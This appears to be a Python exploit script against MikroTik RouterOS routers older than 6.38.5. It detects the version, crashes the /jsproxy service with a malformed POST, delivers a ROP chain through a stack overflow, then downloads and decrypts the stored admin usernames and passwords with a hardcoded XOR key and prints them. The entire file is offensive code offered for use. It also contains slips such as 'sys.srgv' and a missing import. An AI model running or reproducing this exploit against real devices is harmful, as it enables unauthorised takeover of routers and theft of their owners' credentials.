import requests,socket,hashlib
from time import sleep

class printer():
	colors = {
		'OKGREEN' :'\033[92m',
		'WARNING' : '\033[93m',
		'FAIL' : '\033[91m',
		'ENDC': '\033[0m' }
	def __init__(self,CLR):
		self.color = self.colors[CLR]
		self.term = self.colors['ENDC']

	def __call__(self,text):
		print(self.color + '[+] '+self.term+text)
print_s = printer('OKGREEN')
print_w = printer('WARNING')
print_e = printer('FAIL')



class Vuln():
	long_stack=['6.33', '6.33.1', '6.33.2', '6.33.3', '6.33.5', '6.33.6', '6.34', '6.34.1', '6.34.2', '6.34.3', '6.34.4', '6.34.5', '6.34.6', '6.35', '6.35.1', '6.35.2', '6.35.4', '6.36', '6.36.1', '6.36.2', '6.36.3', '6.36.4', '6.37', '6.37.1', '6.37.2', '6.37.3', '6.37.4', '6.37.5', '6.38', '6.38.1', '6.38.2', '6.38.3', '6.38.4']
	def __init__(self,ip,port):
		self.ip=ip
		self.port=port
		self.version=self.get_version()
		self.vulnerable=self.check_vulnerable()
		self.ropChain=self.get_rop()
	def get_version(self):
		resp = requests.get('http://%s:%s'%(self.ip,self.port))
		response = resp.content.decode('utf-8','ignore')
		read_index=response.find('<h1>RouterOS ')
		from_header=response[read_index+14:]
		end_index=from_header.find('</h1>')
		router_version=from_header[:end_index]
		return	router_version
	def check_vulnerable(self):
		#We have to confirm this router version is earlier than 6.38.5
		#Any better logic will be appreciated
		router_version=self.version.replace('.','')#remove decimal points
		router_version=router_version+'0'*(5-len(router_version))#pad to length of 5
		if int(router_version)>63840:
			return False
		return True
	def get_rop(self):
		ropfile=open('x86ropchains','rb').read()
		ropindexes,ropchains=ropfile.split(b'\n\n')
		ropindexes=ropindexes.split(b',')
		if self.version in ropindexes:
			rop_offset=ropindexes.index(bytes(self.version))*932
			ropchain=ropchains[rop_offset:rop_offset+932]
			return ropchain
		else:
			print_e("I may have skipped that one")
	def create_sockets(self,number):
		sockets=[]
		for i in range(number):
			s = socket.socket()
			s.connect((self.ip, self.port))
			sockets.append(s)
		return sockets
	def send_data(self,s,data):
		s.send(data)
		sleep(0.5)
	def crash(self):
		s = self.create_sockets(1)[0]
		self.send_data(s,"POST /jsproxy HTTP/1.1\r\nContent-Length: -1\r\n\r\n")
		self.send_data(s,b'A' * 4096)
		s.close()
		sleep(2.5)
	def extract_login(self):
		self.results=[]

		req=requests.get("http://%s:%s/winbox/index"%(self.ip,self.port))
		userdata=req.content
		user_pass_pairs=userdata.split(b"M2")[1:]
		for i in user_pass_pairs:
			usrdata=i.split(b"\x01\x00\x00\x21")[1]
			pwddata=i.split(b"\x11\x00\x00\x21")[1]

			username=usrdata[1:1+ord(usrdata[0])]
			pwdenc=pwddata[1:1+ord(pwddata[0])]

			pwkey=hashlib.md5(username + b"283i4jfkai3389").digest()
			password=""
			for i in range(len(pwdenc)):
				password+=chr(ord(pwdenc[i])^ord(pwkey[i%len(pwkey)]))
			password=password.split(b'\x00')[0]
			self.results.append([username,password])
	def celebrate(self):
		users=map(lambda x: x[0],self.results)
		passwords=map(lambda x:x[1],self.results)

		longest_user_len=len(sorted(users,key=len)[-1])
		longest_pass_len=len(sorted(passwords,key=len)[-1])

		longest_user_len = longest_user_len if longest_user_len > 4 else 4
		longest_pass_len = longest_pass_len if longest_pass_len > 4 else 4

		print_s("=-"*((longest_pass_len+longest_user_len+8)/2))
		print_s("| USER%s | PASS%s |"%((longest_user_len-4)*" ",(longest_pass_len-4)*" "))
		print_s("=-"*((longest_pass_len+longest_user_len+8)/2))

		for i in self.results:
			userpad = i[0]+(longest_user_len-len(i[0]))*" "
			passpad = i[1]+(longest_pass_len-len(i[1]))*" "
			print_s("| %s | %s |"%(userpad,passpad))

		print_s("=-"*((longest_pass_len+longest_user_len+8)/2))
	def exploit(self):
		if self.vulnerable:
			self.crash()
			s1,s2=self.create_sockets(2)
			stack_size=167936 if self.version in self.long_stack else 8425472
			self.send_data(s1,"POST /jsproxy HTTP/1.1\r\nContent-Length: %s\r\n\r\n"%stack_size)
			self.send_data(s1,b'A'*(4076))
			self.send_data(s2,"POST /jsproxy HTTP/1.1\r\nContent-Length: 32768\r\n\r\n")
			self.send_data(s1,self.ropChain)
			s2.close()
			sleep(2.5)
			self.extract_login()
			self.celebrate()
		else:
			print_e("How can I attack a target that is not vulnerable?")
if __name__ == "__main__":
	if len(sys.srgv) > 1:
		router=Vuln(sys.argv[1],sys.argv[2] if len(sys.srgv) == 3 else 80)
		router.exploit()
	else:
		print_e('Usage: %s IP [PORT]'%sys.argv[0])